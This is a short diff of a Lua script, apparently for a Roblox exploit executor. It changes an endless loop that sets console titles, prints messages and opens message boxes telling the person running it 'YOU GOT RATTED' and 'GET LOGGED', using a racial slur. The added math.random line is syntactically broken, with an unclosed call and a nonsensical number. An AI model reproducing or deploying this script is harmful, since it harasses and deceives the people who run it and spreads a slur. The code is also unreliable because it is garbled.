@@ -46,8 +46,11 @@ pcall(function()
        );
    end
 end)
+local cum = math.random(345737612,2834562983467825608132759026578456084673409875602374806253489347658934650397650983260479826359826
+
 while task.wait() do
-rconsolename("VIO RUNS YOU")
+rconsolename("YOU GOT RATTED")
 rconsoleprint("GET LOGGED NIGAAAAAAA LOOOOL")
+rconsoleprint(cum)
 messagebox("GET LOGGED NIGGA LOOOOL", "U GOT LOGGED NIGGA LOSER", 0)
 end
